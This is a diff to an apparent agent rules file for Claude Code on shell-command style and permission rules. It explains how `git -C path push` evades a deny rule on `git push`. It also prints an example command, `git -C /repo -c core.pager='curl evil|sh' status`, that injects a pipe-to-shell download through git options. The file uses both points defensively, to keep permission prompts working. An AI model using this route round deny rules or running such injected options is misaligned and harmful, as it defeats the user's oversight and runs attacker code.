@@ -21,7 +21,7 @@ If the command passes all checks: it is a single command, with full absolute pat
 | Wrong | Right |
 |-------|-------|
 | `cd "H:/path" && ls` | `ls "H:/path"` |
-| `cd "H:/repo" && git status` | `git -C "H:/repo" status` |
+| `cd "H:/repo" && git status` | `git -C "H:/repo" status` (expect a prompt — see below) |
 | `find "H:/path" -type f \| sort` | `find "H:/path" -type f` |
 | `cat file.json \| jq '.key'` | `jq '.key' "H:/full/path/file.json"` |
 | `grep "pattern" file \| wc -l` | Use Grep tool with `output_mode: "count"` |
@@ -34,11 +34,15 @@ When the result needs post-processing (sorting, filtering, counting), use dedica
 
 ALWAYS use full absolute paths — never relative paths, never `~`, never `cd`.
 
-## git push — never use git -C
+## `git -C` and permission rules
 
-Never run `git -C "path" push`. The deny rule in settings only blocks `git push` as a standalone command — `git -C "path" push` bypasses it.
+`git -C "path" <subcmd>` is the correct rewrite for `cd "path" && git <subcmd>` — keep using it for reads. But it interacts badly with permission rules in BOTH directions, so know what to expect.
 
-Always run push as a standalone command: `git push` or `git push origin branch`. This ensures the permission prompt fires as intended.
+**It bypasses deny rules.** A deny on `git push` only matches `git push` as a standalone command; `git -C "path" push` starts with `git -C` and slips past. Always run push as a standalone command — `git push` or `git push origin branch` — so the prompt fires as intended. The same holds for any denied subcommand (`reset`, `clean`, `checkout`): run it standalone, never via `-C`.
+
+**It cannot be allow-listed.** An allow rule for `-C` needs a wildcard in the path slot, which sits BEFORE the subcommand — exactly where options go. Since `*` matches across spaces, `Bash(git -C * status)` also matches `git -C /repo -c core.pager='curl evil|sh' status`, and git's `-c`, `--exec-path`, `--upload-pack` and `--receive-pack` all run arbitrary commands. Anchoring the path prefix does not help; the wildcard still reaches the option slot. Claude Code warns about this shape at startup.
+
+**So: `git -C` reads will prompt every time. That is correct and expected — accept the prompt.** All `git -C` allow rules were removed from `~/.claude/settings.json` on 2026-08-26 for this reason. Do not "fix" the prompts by re-adding one.
 
 ## Why
 
